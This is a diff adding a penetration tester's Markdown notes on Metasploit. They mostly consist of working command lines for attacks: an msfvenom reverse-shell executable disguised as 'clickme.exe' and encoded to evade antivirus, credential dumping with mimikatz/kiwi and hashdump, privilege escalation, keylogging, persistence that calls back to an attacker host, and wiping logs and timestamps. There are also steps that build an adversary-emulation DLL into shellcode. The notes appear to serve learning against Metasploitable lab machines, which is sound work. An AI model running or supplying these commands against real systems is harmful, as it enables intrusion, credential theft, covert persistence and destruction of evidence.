@@ -1,13 +1,267 @@
+# Metasploit
+
+## Installation
+
+{lang="bash"}
+    sudo apt -y install msfpc
+
+## Scanning
+
+In Auxilary/Scanner folder
+
+{lang="bash"}
+    msfconsole
+    use auxilary/scanner<type>/<name>
+    show options
+    set RHOSTS <ip-range>
+    run
+
+## Nmap integration
+
+## Nessus
+
+Create a Nessus bridge
+
+{lang="bash}
+    load nessus
+    nessus_connect username:password@<ip>:<port>
+    nessus_policy_list   # List nessus policies (something like templates)  => <policy uuid>
+    nessus_scan_new <policy_uuid> <scan name> <description> <target(s)>   # define a new scan, scan will have a new <id>
+    nessus_scan_launch <id>     # start this scan
+    nessus_scan_list -c    # List of completed scans and their ID
+    nessus_report_hosts <scan_id>   # host list, vulnerability count
+    nessus_report_vulns <scan_id>   # list of host vulnerabilities, very detailed
+
+%% Do not forget: nessus_help
+
+## Metasploit db
+
+* db status: Get database status
+* hosts <ip>: info in database for a specific host
+* services <ip>: list found services for a specific ip
+* db_nmap -A <ip>: Does nmap scan and stores data into db
+
+## Meterpreter
+
+An in memory implant that can connect back to the attacker and offer a shell.
+
+### Meterpreter basics
+
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
+### Gaining Access
+
+{lang="bash"}
+    search <app name>   # looks up exploits
+    search type:exploit target:<app name>  # looks up exploits
+    info <exploit name>  # Returns more info for a given exploit
+    use <exploit>
+    show options   # as we are now in exploit context these are the exploit options
+    show payloads  # list of available payloads
+    set payload <name>
+    show options   # exploit and payload options
+    set <option>
+    exploit   # ...wait...get shell
+
+### MSFVenom generate payload
+
+{lang="bash"}
+    msfvenom --platform windows --payload windows/meterpreter/reverse_tcp lhost=<ip> lport=1234 -e x86/shikata_ga_nai -f exe -o clickme.exe
+
+Generates an exe file that will contain a meterpreter
+
+Iterators can be used to make it harder to detect
+
+Shikata Ga Nai is the encoder. Addint the parameter *-i 5* will add 5 encoding iterations to the generation
+
+{lang="bash"}
+    msfvenom -l encoders # List additional encoders
+
+### Veil
+
+[Veil](https://github.com/Veil-Framework/Veil) can be separately installed. It creates payloads better hidden than the default set.
+
+./Veil.py
+
+Metasploit must use the resource file generated together with the payload:
+
+{lang="bash"}
+    msfconsole -r <resource_file>
+
+### Sessions
+
+Metasploit can have several parallel sessions to controlled machines
+
+{lang="bash"}
+    sessions  # List sessions
+    sessions -i 5  # Switch to session 5
+
+
+
+
+
+
+### Escalate permissions
+
+*getuid* will display permissions. NT AUTHORITY\SYSTEM is what you want
+
+* getsystem command
+* ps to find services and migrate to a privileged process (explorer)
+* some specific payloads can get you higher privileges (in an exploit use "show info" and find a more specific target setting if available. Use that.)
+    * set target <os id>
+    * show payloads (which are now specific)
+    * set payload <specific one>
+
+
+Permissions:
+
+* LocalSystem (NT AUTHORITY\SYSTEM) microsoft.com/en-us/windows/win32/services/localsystem-account
+* LocalService (NT AUTHORITY\LocalService) https://docs.microsoft.com/en-us/windows/win32/services/localservice-account
+* NetworkService (NT AUTHORITY\NetworkService) https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account
+
+
+%% TODO: Check sysinfo command
+
+### Passwords
+
+Execute Mimikatz/Kiwi. Needs system privileges. You also will to migrate into a process of 64 bit first
+
+{lang="bash"}
+    load mimikatz
+    help mimikatz  # lists commands
+
+Commands can be
+    * kerberos
+    * msv
+    * tspkg
+    * wdigest
+
+%% TODO: Investigate command listing    mimikatz_command -f fu::
+%%  TODO: mimikatz_command -f sekurlsa::searchPasswords    (for different password sources)
+
+{lang="bash"}
+    load kiwi
+    help kiwi
+    creds_all     # Get all credentials (logged in ones)
+    lsa_dump_sam  # dump username password file
+
+
+
+### Maintaining Access
+
+Meterpreter has several commands to now abuse the target system:
+
+* migrate: Migrate meterpreter implant to another process. Pick one with more permissions
+* shell: get command shell
+* getpid: get current process info
+* run <script name>: run a pre-prepared script. They are sorted into sub-categories. Happy browsing
+* upload: Upload to push a file to the compromised machine
+
+%% TODO: List running processes
+
+### Railgun
+
+Windows Meterpreter feature to load any DLL on the exploited system
+
+*irb* in Meterpreter gives you a ruby shell. You can directly use Railgun from there and execute DLL functions.
+Only a few common dlls can be called directly.
+
+{lang="ruby"}
+    railgun.<dll>.<function>(<params>)   # maybe add ["return"] for return value
+
+%% TODO: Test  railgun.client.sys.config.sysinfo and railgubn.shell32.IsUserAnAdmin
+
+## Covering tracks
+
+Modify file times
+
+{lang="bash"}
+    timestomp <file> -v    # List times
+    timestomp <file> -z "04/12/2000 13:02:01"    # set all timestamps
+
+    %% TODO: Read and itnegrate https://resources.infosecinstitute.com/topic/mitre-attck-vulnerability-timestomping/
+
+Clear event logs
+
+{lang="bash"}
+    clearev   # All logs will be gone
+
+Windows tool to view logs: eventvwr
+
+
+## Gather Information
+
+in modules/post
+
+search post/windows/recon
+search post/windows/gather
+
+search post/multi for multiple OSes
+
+run post/windows/gather/hashdump
+
+%% TODO: Link to password cracking
+
+## Pivot
+
+## Persistence
+
+On a meterpreter session
+
+{lang="bash"}
+    run persistence -h   # Help
+    run persistence -A -P windows/meterpreter/reverse_tcp -X -i 240 -p <port> -r <attacker>
+
+## Screenshots
+
+Using Armitage here may be convenient as it has a UI
+
+{lang="bash"}
+    load espia
+    screengrab
+
+Several screen shots in series:
+
+{lang="bash"}
+    run post/windows/gather/screen_spy
+
+Results will be stored in loot
+
+## Keylogging
+
+Migrate to a user process first !
+
+{lang="bash"}
+    keyscan_start
+    keyscan_stop
+    keyscan_dump
+
+## Metasploitable 2
+
+https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
+
+Very old Linux version
+
+## Metasploitable 3
+
+https://github.com/rapid7/metasploitable3
+
+(Ubuntu and Windows machine)
+
+* Ubuntu is a vagrant file
+*
+
+## Pymetasploit
+
+https://github.com/DanMcInerney/pymetasploit3
+
+%% Link with DVA chapter !
+
 ## Executing in memory
 
 https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/
 
-%% Metasploitable: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
 
-
-
-
-%% TODO: Armitage
 
 https://blog.rapid7.com/2018/10/09/introducing-metasploits-first-evasion-module/
 
@@ -18,9 +272,77 @@ https://blog.rapid7.com/2018/10/09/introducing-metasploits-first-evasion-module/
 %% Exploit chain with beef and metasploit: https://medium.com/@bluedenkare/1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6
 
 
+## Building tools
 
-## Something similar: Vulnerability Assessment
+Some time it is necessary to compile tools based on metasploit shellcode. Cross compilation or
+VisualStudio on Linux could be needed to get those Windows tools. Some experience with those here:
+
+### Mingw
+
+As an example I am building this tool on a Kali machine:
+
+https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
+
+Cross compilation requirements:
+
+{lang="bash"}
+    sudo apt -y install g++-mingw-w64
+    sudo apt -y install mingw-w64
+    sudo apt -y install powershell
+    git clone https://github.com/monoxgas/sRDI
+
+
+Example fixing and building a payload file:
+
+{lang="bash"}
+    wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp
+    wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/ConvertTo-Shellcode.ps1
+    sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal.cpp
+    x86_64-w64-mingw32-g++ -shared babymetal.cpp -o BabyMetal.dll
+    python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal ./BabyMetal.dll
+    base64 BabyMetal.bin > encoded.txt
+
+
+*pwsh ConvertTo-Shellcode.ps1 -File BabyMetal.dll -FunctionName BabyMetal* Does not work on linux as system modules are missing.
+
+
+sed is required because *windows.h* is a lowercase file on linux. But the include in the example files is *Windows.h*
+
+### VisualStudio on Linux
+
+## Sources
+
+[Metasploit Unleashed: Build Defense against complex attacks](https://learning.oreilly.com/videos/metasploit-unleashed-build/9781789618846)
+
+[Metasploit Unleashed: Free ethical hacking course](https://www.offensive-security.com/metasploit-unleashed/)
+
+[Mastering Metasploit 4th edition](https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/)
+
+## Metasploit glossary
+
+* Interfaces: MSFConsole is the main console. MSFCLI (not supported anymore) for automated scripts,
+* Armitage: Graphical interface
+* MSFCLI: deprecated, use msfconsole -x instead
+* Auxilary modules: Port scanners, sniffers, ...
+* Encoders: Encode payloads to comply with target systems and detection
+* NOPS: patched to payloads to keep size consistent
+* Metasploit database: PostgreSQL DB to deal with large campaigns (command: msfdb)
+* Modules: Plugins. Containing exploits or offering other actions
+* Listener: Waiting for incoming connections from the exploit
+* RHost: Target machine address. Remote Host
+* LHost: Local Host. Attacker machine
+* workspace: Different db areas to separate your projects
+
+* Exploit: Taking advantage of a vulnerability
+* Payload: Code to execute after exploitation
+* Session: A connection to a Meterpreter
+* Meterpreter: Implant running on a target. Just in memory. Will connect to your Metasploit and offer a commandline
+
+
+%% ## Something similar: Vulnerability Assessment
 
 %% TODO: Nessus Vulnerability Assessment
 
 %% TODO: Open Vas /OpenVas https://www.openvas.org/index-de.html   Vulnerability Assessment
+
+%% "show evasion" for evasion tech in Metasploit
